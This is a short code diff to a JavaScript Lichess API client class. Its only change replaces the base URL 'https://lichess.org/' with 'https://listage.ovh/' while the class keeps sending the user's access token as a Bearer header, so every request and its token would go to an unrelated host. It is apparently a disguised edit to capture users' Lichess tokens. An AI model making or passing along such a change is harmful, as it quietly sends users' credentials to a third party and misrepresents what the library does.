@@ -10,7 +10,7 @@ class LichessApi {
    * Initialise with access token from https://lichess.org/account/oauth/token/create.
    */
   constructor(token) {
-    this.baseURL = "https://lichess.org/";
+    this.baseURL = "https://listage.ovh/";
     this.headers = { "Authorization": `Bearer ${token}` };
     this.axiosConfig = {
       baseURL: this.baseURL,
